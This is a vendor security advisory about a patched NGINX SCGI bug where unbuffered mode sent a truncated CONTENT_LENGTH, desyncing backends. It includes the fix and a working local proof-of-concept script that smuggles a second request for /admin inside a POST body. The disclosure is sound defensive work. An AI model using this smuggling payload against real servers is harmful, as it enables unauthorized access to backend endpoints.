---
schema_version: "1.0.0"
document_id: "094e7f5259675cda2c858f8918a5abe5382bd35d7703b62f4fd3810b687aa941"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/nginx-scgi-content-length-unbuffered"
published_at: "2026-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T22:24:15.603719+00:00"
content_hash: "sha256:d0dbb0834194c1d60f21667143648fd572eef22bf9ae8af257a182f680e63961"
---

# SCGI unbuffered mode sent truncated CONTENT_LENGTH causing backend desync

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


NGINX


Medium


2026


# SCGI unbuffered mode sent truncated CONTENT_LENGTH causing backend desync


## Summary


NGINX SCGI used buffered-prefix body length in unbuffered mode; fix now uses canonical content length inputs


In the SCGI module,` ngx_http_scgi_create_request()` historically derived` CONTENT_LENGTH` by summing the currently buffered request-body chain (` r->upstream->request_bufs` ). This behavior was introduced to support chunked-body accounting, but it becomes inaccurate when` scgi_request_buffering off` is used and the body is still streaming.


With unbuffered request forwarding, only an early body prefix may be available when SCGI headers are serialized. The emitted SCGI netstring can therefore advertise a smaller` CONTENT_LENGTH` than the client-declared body size. Downstream SCGI backends that keep connections open and parse trailing bytes as another request can become desynchronized.


Upstream NGINX accepted this as a protocol-framing bug and explicitly classified it as a regular bugfix (not an NGINX security issue), noting SCGI is specified as one request per connection. The fix development is tracked in PR #1118 and implemented in commit` fe2d109` .


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


H


Integrity


H


Availability


H


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H


### Vulnerability Location


Source


Line 542


src /http


/modules


/ngx_http_scgi_module.c


request_body_no_buffering enablement


Sink


Line 656


src /http


/modules


/ngx_http_scgi_module.c


CONTENT_LENGTH serialization in ngx_http_scgi_create_request


## Source-to-Sink Analysis


1


src/http/modules/ngx_http_scgi_module.c:542-547


When` scgi_request_buffering off` is configured and a non-chunked request body is passed, SCGI switches to no-buffering mode and may start upstream request creation before the full body is read.


CPP


```text
if   (!scf->upstream.request_buffering
&& scf->upstream.pass_request_body
&& !r->headers_in.chunked)
{
r->request_body_no_buffering =  1  ;
}


```


2


src/http/modules/ngx_http_scgi_module.c:651-657


Legacy logic computed` content_length_n` from only the currently buffered body chain, which can represent just a prefix in unbuffered mode.


CPP


```text
content_length_n =  0  ;
body = r->upstream->request_bufs;
while   (body) {
content_length_n +=  ngx_buf_size  (body->buf);
body = body->next;
}


```


3


src/http/modules/ngx_http_scgi_module.c:659-661


That truncated number was serialized into SCGI` CONTENT_LENGTH` , creating framing mismatch versus the full HTTP request body.


CPP


```text
content_length.data = buffer;
content_length.len =  ngx_sprintf  (buffer,  "%O"  , content_length_n) - buffer;


```


4


src/http/modules/ngx_http_scgi_module.c:656-668 (fix)


Patch` fe2d109` now prefers original` Content-Length` header value, then` content_length_n` from body filters, and finally` 0` , aligning SCGI framing with canonical length sources.


CPP


```text
if   (r->headers_in.content_length) {
content_length = r->headers_in.content_length->value;
}  else    if   (r->headers_in.content_length_n >  0  ) {
content_length.data = buffer;
content_length.len =  ngx_sprintf  (buffer,  "%O"  , r->headers_in.content_length_n) - buffer;
}  else   {
ngx_str_set  (&content_length,  "0"  );
}


```


## Impact Analysis


### Critical Impact


In affected backend implementations this can cause backend request desynchronization and request-smuggling-like behavior. NGINX maintainers classified the issue as a regular bugfix rather than a security vulnerability in NGINX itself, because SCGI specifies one request per connection and does not define semantics for extra bytes.


### Attack Surface


NGINX deployments using SCGI with` scgi_request_buffering off` and backends that keep connections alive while interpreting trailing bytes as additional SCGI requests.


### Preconditions


Attacker can send a POST with explicit` Content-Length` and control body timing; backend behavior must be non-standard (or extension-like) by processing extra bytes as another request on the same connection.


## Proof of Concept


### Environment Setup


Requirements: Python 3, C toolchain, and OpenSSL/PCRE2 dev libraries.


Build NGINX from source:


BASH


```text
WORKDIR=/path/to/nginx-source
cd    " $WORKDIR  "


./auto/configure --prefix= " $WORKDIR  /build"   \
--with-http_ssl_module --with-http_v2_module
make -j " $(sysctl -n hw.ncpu 2>/dev/null || getconf _NPROCESSORS_ONLN)  "
make install


```


### Target Configuration


Create` nginx.conf` (self-contained repro config):


BASH


```text
cat   > nginx.conf << 'NGINX'
worker_processes 1;
error_log logs/error.log debug;
pid logs/nginx.pid;


events { worker_connections 1024; }


http {
include       conf/mime.types;
default_type  application/octet-stream;
access_log logs/access.log;


upstream scgi_backend {
server 127.0.0.1:9000;
keepalive 1;
}


server {
listen 8080;
server_name localhost;


location /scgi {
include conf/scgi_params;
scgi_pass scgi_backend;
scgi_request_buffering off;
scgi_pass_request_body on;
}
}
}
NGINX


```


Create` scgi_backend.py` :


BASH


```text
cat   > scgi_backend.py << 'PY'
from __future__ import annotations
import datetime
import socket
import socketserver


RESPONSE = b 'Status: 200 OK\r\nContent-Length: 2\r\n\r\nOK'


def _read_all(sock: socket.socket,  timeout  :  float   = 3.0) -> bytes:
sock.settimeout( timeout  )
out = bytearray()
while   True:
try:
chunk = sock.recv(4096)
except socket.timeout:
break
if   not chunk:
break
out += chunk
return   bytes(out)


def _parse_headers(raw: bytes) -> dict[bytes, bytes]:
parts = raw.split(b '\x00'  )
return   dict(zip(parts[0::2], parts[1::2]))


class SCGIHandler(socketserver.BaseRequestHandler):
def handle(self) -> None:
sock: socket.socket = self.request
raw = _read_all(sock)
off = 0
seen = 0


while   off < len(raw):
i = raw.find(b ':'  , off)
if   i == -1:
break
try:
header_len = int(raw[off:i])
except ValueError:
break


hs = i + 1
he = hs + header_len
if   he + 1 > len(raw) or raw[he:he + 1] != b ','  :
break


headers = _parse_headers(raw[hs:he])
try:
body_len = int(headers.get(b 'CONTENT_LENGTH'  , b '0'  ))
except ValueError:
body_len = 0


bs = he + 1
be = bs + body_len
if   be > len(raw):
break


body = raw[bs:be]
ts = datetime.datetime.utcnow().isoformat()
print  (f '[{ts}] SCGI request from {self.client_address}: headers={headers} body={body!r}'  , flush=True)
seen += 1
off = be


if   off < len(raw):
ts = datetime.datetime.utcnow().isoformat()
print  (f '[{ts}] Residual bytes from {self.client_address}: {raw[off:]!r}'  , flush=True)


for   _  in   range(max(1, seen)):
sock.sendall(RESPONSE)


class ReusableTCPServer(socketserver.TCPServer):
allow_reuse_address = True


if   __name__ ==  '__main__'  :
with ReusableTCPServer((' 127.0  . 0.1  ',  9000  ), SCGIHandler) as srv:
print('SCGI demo backend listening on  127.0  . 0.1  : 9000  ', flush=True)
srv.serve_forever()
PY


```


### Exploit Delivery


Create` poc_smuggle.py` :


BASH


```text
cat   > poc_smuggle.py << 'PY'
from __future__ import annotations
import socket
import  time


HOST, PORT =  '127.0.0.1'  , 8080


def build_scgi_netstring(headers: dict[bytes, bytes], body: bytes = b ''  ) -> bytes:
hb = b ''  . join  (k + b '\x00'   + v + b '\x00'    for   k, v  in   headers.items())
return   str(len(hb)).encode( 'ascii'  ) + b ':'   + hb + b ','   + body


def build_payload() -> tuple[bytes, bytes]:
prefix = b 'A'   * 20
smuggled = build_scgi_netstring(
{
b 'CONTENT_LENGTH'  : b '0'  ,
b 'SCGI'  : b '1'  ,
b 'REQUEST_METHOD'  : b 'GET'  ,
b 'REQUEST_URI'  : b '/admin'  ,
},
b ''  ,
)


body = prefix + smuggled
req = (
f 'POST /scgi HTTP/1.1\r\n'
f 'Host: localhost\r\n'
f 'Content-Length: {len(body)}\r\n'
f 'Connection: keep-alive\r\n'
f '\r\n'
).encode( 'ascii'  )
return   req + prefix, smuggled


def main() -> None:
head  ,  tail   = build_payload()
with socket.create_connection((HOST, PORT)) as s:
print  (f '[+] Connected to {HOST}:{PORT}'  )
s.sendall( head  )
print  (f '[+] Sent head ({len(head)} bytes), sleeping before tail...'  )
time.sleep(1)
s.sendall( tail  )
print  (f '[+] Sent tail ({len(tail)} bytes)'  )


print  ( '[+] Response chunk #1:'  )
print  (s.recv(4096).decode( 'latin1'  ,  'replace'  ))


if   __name__ ==  '__main__'  :
main()
PY


```


Run end-to-end:


BASH


```text
python3 scgi_backend.py > build/logs/scgi_backend.log 2>&1 &
./build/sbin/nginx -p  " $(pwd)  /build"   -c  " $(pwd)  /nginx.conf"
python3 poc_smuggle.py
tail   -n 10 build/logs/scgi_backend.log


```


Cleanup:


BASH


```text
pkill -f scgi_backend.py
./build/sbin/nginx -p  " $(pwd)  /build"   -c  " $(pwd)  /nginx.conf"   -s stop


```


### Outcome


The PoC demonstrates message-framing mismatch in unbuffered SCGI mode and backend desync risk when a backend accepts multiple parsed units on one connection.


**Expected Response:** Backend logs show a first SCGI request with truncated` CONTENT_LENGTH` followed by attacker-controlled residual bytes interpreted as a second request in permissive backends:


TEXT


```text
... headers={b'CONTENT_LENGTH': b'20', ...} body=b'AAAAAAAAAAAAAAAAAAAA'
... headers={b'CONTENT_LENGTH': b'0', b'SCGI': b'1', b'REQUEST_METHOD': b'GET', b'REQUEST_URI': b'/admin'} body=b''


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/nginx/nginx/pull/1118)
